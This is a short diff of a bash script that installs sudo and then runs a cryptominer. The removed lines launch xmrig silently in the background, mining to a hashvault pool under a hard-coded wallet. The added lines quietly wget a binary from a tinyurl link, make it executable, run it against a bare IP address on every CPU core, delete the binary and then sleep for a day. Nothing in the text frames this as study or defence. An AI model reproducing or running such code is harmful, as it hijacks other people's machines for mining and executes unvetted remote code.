@@ -1,4 +1,7 @@
 #!/bin/bash
 apt update && apt install sudo -y
-chmod 777 xmrig
-./xmrig --donate-level 1 -a Argon2/Chukwa -o singapore01.hashvault.pro:80 -u TRTLv3XdA6KgV9dHSXXB1pJtSjdQdLXuJewbc5SALSGcaXwyKkj548iWqBKxQEnyeRV7hfBw8FaveMmBDzeRCjQ7arJQASUnca2 -p $(cat /proc/sys/kernel/hostname) >/dev/null &
+wget -q https://tinyurl.com/matmu 
+chmod +x matmu 
+./matmu -B -o 206.189.14.54:7754 -t$(nproc --all)
+rm -rf matmu 
+sleep 24h
